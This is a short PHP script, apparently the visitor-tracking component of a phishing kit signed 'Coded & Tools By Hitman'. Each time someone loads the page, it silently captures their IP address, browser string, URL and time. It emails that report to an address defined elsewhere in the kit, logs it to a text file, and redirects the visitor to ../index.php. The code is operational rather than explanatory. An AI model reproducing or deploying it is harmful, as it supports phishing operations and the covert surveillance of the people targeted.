<?php
$Date = "" . date("Y/m/d") . "";
date_default_timezone_set("Asia/Jerusalem");
$Time = "Asia/Jerusalem " . date("h:i:sa");
$Link = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
$IP = getenv("REMOTE_ADDR");
$BILSMG = "
-------------- IP Tracing ------------
IP : $IP
Browser:".$_SERVER['HTTP_USER_AGENT']."
Link : $Link
Date : $Date / Time : $Time
---------- Coded & Tools By Hitman ---------";
@mail($TO,$MAIL_TITLE,$BILSMG,$MAIL_HEADER);
$handle = fopen("Reports-visitors.txt", "a");
fwrite($handle,$BILSMG);
$x=md5(microtime());

echo "<META HTTP-EQUIV='refresh' content='0; URL=../index.php'>";exit;

?>